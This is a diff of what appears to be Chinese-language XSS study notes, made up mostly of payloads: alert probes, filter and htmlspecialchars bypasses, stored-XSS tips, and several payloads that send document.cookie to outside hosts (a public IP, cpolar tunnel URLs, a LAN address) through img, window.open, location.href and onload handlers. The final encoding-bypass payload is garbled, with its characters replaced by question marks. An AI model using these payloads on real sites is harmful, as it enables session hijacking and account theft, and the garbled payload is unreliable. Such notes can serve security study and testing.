@@ -22,9 +22,12 @@ http://8.130.20.254/
 onfocus
 onblur
 
-"><a href='javascript:alert(1)'>xss</a>//
+`"><a href='javascript:alert(1)'>xss</a>//`
 
-# 外带
+`<script>alert(document.cookie)</script>`
+
+## 外带
+
 ```
 攻击者通常会利用已经存在的 XSS 漏洞，在受害者的浏览器上注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，然后攻击者就可以使用该 Cookie 来`冒充受害者`，执行一些恶意操作，例如盗取用户的账户信息、发起钓鱼攻击等。
 
@@ -35,11 +38,11 @@ var img=document.createElement("img"); img.src="http://118.31.168.198:39543/"+do
 
 <script>window.open('https://7dc5fa72.r7.cpolar.top/platform/?cookie='+document.cookie)</script>
 
-<script>location.href='http://185313a9.r1.cpolar.top/platform/'+document.cookie</script>
+<script>location.href='http://192.168.52.128:80'+document.cookie</script>
 
-<svg onload="window.open('https://185313a9.r1.cpolar.top/platform/?cookie='+document.cookie)">
+<svg onload="window.open('http://192.168.52.128:80'+document.cookie)">
 
-<iframe onload="window.open('https://185313a9.r1.cpolar.top/platform/?cookie='+document.cookie)"></iframe>
+<iframe onload="window.open('http://192.168.52.128:80'+document.cookie)"></iframe>
 
 <body onload="window.open('https://185313a9.r1.cpolar.top/platform/?cookie='+document.cookie)">
 
@@ -80,7 +83,8 @@ document.body.append(img);
 
 ```
 
-# 存储型
+## 存储型
+
 ```
 注意：有些时候网页收到污染就无法继续进行，
 
@@ -104,7 +108,7 @@ POST：
 
 ```
 
-# 常见过滤手段
+## 常见过滤手段
 
 **空格过滤**
 ```
@@ -117,7 +121,8 @@ xss这个词有时候也会被过滤
 ```
 
 ![](./image/xss-1.png)
-#### 直接用"><script>alert("1")</script>构造闭合
+
+直接用"><script>alert("1")</script>构造闭合
 
 ![](./image/xss-2.png)
 看到使用了htmlspecialchars方法，htmlspecialchars是将特殊符号转换成HTML实体。HTML为了防止特殊符号，如 "<"等html当成标签<br>
@@ -158,3 +163,10 @@ t_sort=" type='text' onclick='javascript:alert(1)'//
 ```javascript
 #"><img src=/ onerror=alert(document.cookie)>
 ```
+
+## 编码绕过
+
+```
+?='',?=!?+?,?=!?+?,?=?+{},?=?[?++], ?=?[?=?],?=++?+?,?=?[?+?],?[?+=?[?] +(?.?+?)[?]+?[?]+?+?+?[?]+?+?+?[?] +?][?](?[?]+?[?]+?[?]+?+?+"(?)")()
+```
+
